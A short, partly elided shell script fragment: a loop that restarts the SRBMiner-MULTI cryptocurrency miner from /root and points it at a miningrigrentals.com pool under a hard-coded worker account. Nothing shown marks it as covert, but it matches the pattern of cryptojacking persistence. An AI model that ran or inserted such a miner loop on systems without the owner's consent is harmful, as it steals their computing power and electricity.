...
while true; do
    ...
    if [ -z "$CPU_USAGE" ]; then
        ...
        pgrep -f SRBMiner-MULTI > /dev/null || /root/SRBMiner-Multi-2-6-6/SRBMiner-MULTI  --disable-gpu -a power2b -o us-east01.miningrigrentals.com:3333 -u cecepabdul67.325911 -p x &
